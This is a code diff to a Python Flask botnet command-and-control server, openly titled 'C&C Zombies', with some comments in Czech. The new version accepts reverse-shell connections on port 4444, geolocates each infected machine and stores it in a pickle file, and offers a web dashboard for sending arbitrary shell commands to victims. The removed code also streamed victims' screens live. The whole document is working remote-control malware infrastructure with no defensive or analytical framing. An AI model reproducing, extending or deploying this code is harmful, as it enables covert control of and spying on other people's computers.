@@ -3,168 +3,154 @@ import threading
 import pickle
 import time
 import platform
-from flask import Flask, render_template_string, request, redirect, url_for, Response
 import os
-import uuid
-from geopy.geocoders import Nominatim
-import struct
-import cv2
-import numpy as np
-
-# Server konfigurace
-CMD_PORT = 4444
-STREAM_PORT = 5555
-HOST = '0.0.0.0'
+from flask import Flask, render_template_string, request, redirect, url_for, Response
+import geocoder
 
 app = Flask(__name__)
-geolocator = Nominatim(user_agent="reverse_shell_server")
+HOST = '0.0.0.0'
+SOCKET_PORT = 4444
+PICKLE_FILE = 'bots.pkl'
 bots = {}
-screen_frames = {}
+sessions = {}
 
-# HTML sablona s live aktualizaci a shell tlacitkem
-TEMPLATE = '''
+HTML_TEMPLATE = """
 <!DOCTYPE html>
-<html>
+<html lang=\"en\">
 <head>
-    <title>C&C Zombies</title>
-    <meta http-equiv="refresh" content="5">
+    <meta charset=\"UTF-8\">
+    <title>Zombies Online</title>
     <style>
-        body { background: #111; color: #eee; font-family: sans-serif; }
-        table { border-collapse: collapse; width: 100%; background: #222; }
-        th, td { border: 1px solid #333; padding: 10px; text-align: left; }
-        th { background: #444; }
-        a { color: #0f0; text-decoration: none; }
+        body { font-family: Arial, sans-serif; background: #111; color: #eee; padding: 20px; }
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+        th, td { padding: 10px; border: 1px solid #444; text-align: left; }
+        th { background-color: #222; }
+        .online { color: lime; }
+        .offline { color: red; }
+        a { color: deepskyblue; text-decoration: none; }
+        textarea { width: 100%; height: 200px; background: #222; color: #0f0; font-family: monospace; }
     </style>
+    <script>
+        setInterval(() => { fetch('/session').then(res => res.text()).then(html => document.body.innerHTML = html); }, 5000);
+    </script>
 </head>
 <body>
-<h2>Zombies Online: {{ bots|length }}</h2>
-<table>
-<tr><th>ID</th><th>Status</th><th>IP</th><th>OS</th><th>Country</th><th>Shell</th><th>Monitor</th></tr>
-{% for bot_id, info in bots.items() %}
-<tr>
-    <td>{{ bot_id }}</td>
-    <td>{{ info['status'] }}</td>
-    <td>{{ info['ip'] }}</td>
-    <td>{{ info['os'] }}</td>
-    <td>{{ info['country'] }}</td>
-    <td><a href="/shell-id={{ bot_id }}">🕹️</a></td>
-    <td><a href="/monitor-id={{ bot_id }}">📺</a></td>
-</tr>
-{% endfor %}
-</table>
+    <h1>Zombies Online: {{ online_count }}</h1>
+    <table>
+        <tr>
+            <th>ID</th><th>Status</th><th>IP</th><th>OS</th><th>Shell</th><th>Country</th>
+        </tr>
+        {% for bot_id, info in bots.items() %}
+        <tr>
+            <td>{{ bot_id }}</td>
+            <td class="{{ 'online' if info['status'] == 'Online' else 'offline' }}">{{ info['status'] }}</td>
+            <td>{{ info['ip'] }}</td>
+            <td>{{ info['os'] }}</td>
+            <td><a href="/shell-id={{ bot_id }}">🕹️</a></td>
+            <td>{{ info['country'] }}</td>
+        </tr>
+        {% endfor %}
+    </table>
 </body>
 </html>
-'''
+"""
+
+SHELL_TEMPLATE = """
+<h2>Shell for Bot {{ bot_id }}</h2>
+<form method='post'>
+    <input type='text' name='cmd' style='width:90%;'>
+    <input type='submit' value='Execute'>
+</form>
+<textarea readonly>{{ output }}</textarea><br>
+<a href='/'>⬅ Back</a>
+"""
+
+def save_bots():
+    with open(PICKLE_FILE, 'wb') as f:
+        pickle.dump(bots, f)
+
+def load_bots():
+    global bots
+    if os.path.exists(PICKLE_FILE):
+        with open(PICKLE_FILE, 'rb') as f:
+            bots = pickle.load(f)
+
+def update_bot(ip, os_name):
+    g = geocoder.ip(ip)
+    country = g.country or "Unknown"
+    for bot_id, info in bots.items():
+        if info['ip'] == ip:
+            bots[bot_id].update({
+                'status': 'Online',
+                'last_seen': time.time(),
+                'os': os_name,
+                'country': country
+            })
+            save_bots()
+            return bot_id
+    bot_id = str(len(bots) + 1)
+    bots[bot_id] = {
+        'ip': ip,
+        'status': 'Online',
+        'last_seen': time.time(),
+        'os': os_name,
+        'country': country
+    }
+    save_bots()
+    return bot_id
+
+def socket_listener():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind((HOST, SOCKET_PORT))
+    s.listen(5)
+    print(f"[+] Socket server listening on {HOST}:{SOCKET_PORT}")
+    while True:
+        conn, addr = s.accept()
+        ip = addr[0]
+        try:
+            os_name = conn.recv(1024).decode()
+            bot_id = update_bot(ip, os_name)
+            sessions[bot_id] = conn
+            print(f"[+] Bot {bot_id} ({ip}) connected")
+        except:
+            conn.close()
+
+def cleanup_loop():
+    while True:
+        now = time.time()
+        for bot_id in list(bots):
+            last = bots[bot_id]['last_seen']
+            if now - last > 15:
+                bots[bot_id]['status'] = 'Offline'
+        save_bots()
+        time.sleep(5)
 
 @app.route('/')
-def index():
-    return render_template_string(TEMPLATE, bots=bots)
+def dashboard():
+    online_count = sum(1 for b in bots.values() if b['status'] == 'Online')
+    return render_template_string(HTML_TEMPLATE, bots=bots, online_count=online_count)
 
 @app.route('/shell-id=<bot_id>', methods=['GET', 'POST'])
 def shell(bot_id):
+    output = ''
     if request.method == 'POST':
         cmd = request.form['cmd']
-        bots[bot_id]['socket'].send(cmd.encode())
-        output = bots[bot_id]['socket'].recv(65535).decode(errors='ignore')
-        return render_template_string('<pre>{{output}}</pre><a href="">Back</a>', output=output)
-    return '''
-        <form method="post">
-            <input name="cmd" placeholder="Enter command">
-            <input type="submit" value="Send">
-        </form>
-    '''
-
-@app.route('/monitor-id=<bot_id>')
-def monitor(bot_id):
-    def generate():
-        while True:
-            frame = screen_frames.get(bot_id)
-            if frame:
-                yield (b'--frame\r\n'
-                       b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
-            time.sleep(0.1)
-    return Response(generate(), mimetype='multipart/x-mixed-replace; boundary=frame')
-
-
-def client_handler(client_socket, addr):
-    try:
-        os_info = client_socket.recv(1024).decode()
-        bot_id = str(uuid.uuid4())[:8]
-
-        # Geolokace podle IP
         try:
-            location = geolocator.geocode(addr[0])
-            country = location.address.split(",")[-1] if location else "Unknown"
-        except:
-            country = "Unknown"
+            conn = sessions.get(bot_id)
+            if conn:
+                conn.send(cmd.encode())
+                data = conn.recv(4096).decode()
+                output = data
+        except Exception as e:
+            output = f"Error: {e}"
+    return render_template_string(SHELL_TEMPLATE, bot_id=bot_id, output=output)
 
-        bots[bot_id] = {
-            'ip': addr[0],
-            'os': os_info,
-            'status': 'Online',
-            'country': country,
-            'socket': client_socket
-        }
-
-        while True:
-            time.sleep(5)
-            client_socket.send(b'ping')
-            if not client_socket.recv(1024):
-                break
-    except:
-        pass
-    finally:
-        for id, info in list(bots.items()):
-            if info['socket'] == client_socket:
-                bots[id]['status'] = 'Offline'
-
-
-def stream_listener():
-    s = socket.socket()
-    s.bind((HOST, STREAM_PORT))
-    s.listen(5)
-    print(f"[+] Stream listener on port {STREAM_PORT}")
-    while True:
-        client, addr = s.accept()
-        threading.Thread(target=handle_stream, args=(client,)).start()
-
-
-def handle_stream(conn):
-    bot_id = None
-    while True:
-        try:
-            raw_size = conn.recv(4)
-            if not raw_size:
-                break
-            size = struct.unpack('>I', raw_size)[0]
-            data = b''
-            while len(data) < size:
-                data += conn.recv(size - len(data))
-            frame = data
-
-            # Najdi bot_id podle IP
-            for id, info in bots.items():
-                if info['ip'] == conn.getpeername()[0]:
-                    bot_id = id
-                    break
-
-            if bot_id:
-                screen_frames[bot_id] = frame
-        except:
-            break
-
-
-def command_listener():
-    s = socket.socket()
-    s.bind((HOST, CMD_PORT))
-    s.listen(5)
-    print(f"[+] Command listener on port {CMD_PORT}")
-    while True:
-        client_socket, addr = s.accept()
-        threading.Thread(target=client_handler, args=(client_socket, addr)).start()
-
+@app.route('/session')
+def session():
+    return dashboard()
 
 if __name__ == '__main__':
-    threading.Thread(target=command_listener).start()
-    threading.Thread(target=stream_listener).start()
-    app.run(host='0.0.0.0', port=80, debug=False, threaded=True)
+    load_bots()
+    threading.Thread(target=socket_listener, daemon=True).start()
+    threading.Thread(target=cleanup_loop, daemon=True).start()
+    app.run(host='0.0.0.0', port=80)
